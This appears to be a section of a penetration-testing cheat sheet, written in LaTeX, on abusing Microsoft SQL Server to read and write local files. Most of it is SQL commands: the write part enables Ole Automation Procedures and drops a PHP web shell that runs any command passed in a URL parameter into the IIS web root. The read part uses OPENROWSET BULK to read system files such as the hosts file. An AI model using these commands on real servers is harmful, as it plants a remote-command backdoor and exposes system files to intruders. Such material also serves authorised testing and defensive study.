
\section{Read / Write local files}
\begin{verbatim}
SELECT COUNT(*) 
    FROM fn_my_permissions(NULL, 'DATABASE') 
    WHERE permission_name = 'ADMINISTER BULK OPERATIONS' 
        OR permission_name = 'ADMINISTER DATABASE BULK OPERATIONS';


\end{verbatim}

\subsection{Write file}
To write files using MSSQL, we need to enable
\href{https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option}{Ole
Automation Procedures}, which requires admin privileges, and then execute some stored procedures to create the file

\begin{verbatim}
sp_configure 'show advanced options', 1
GO
RECONFIGURE
GO
sp_configure 'Ole Automation Procedures', 1
GO
RECONFIGURE
GO

DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE
GO

\end{verbatim}

\subsection{Read file}
By default, MSSQL allows file read on any file in the operating system to which the account has read access.

Checking permissions:
\begin{verbatim}
SELECT COUNT(*) FROM fn_my_permissions(NULL, 'DATABASE') 
    WHERE permission_name = 'ADMINISTER BULK OPERATIONS' 
        OR permission_name = 'ADMINISTER DATABASE BULK OPERATIONS';
\end{verbatim}




\begin{verbatim}
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
GO

-- Get the length of a file
SELECT LEN(BulkColumn) FROM OPENROWSET(BULK '<path>', SINGLE_CLOB) AS x

-- Get the contents of a file
SELECT BulkColumn FROM OPENROWSET(BULK '<path>', SINGLE_CLOB) AS x
\end{verbatim}
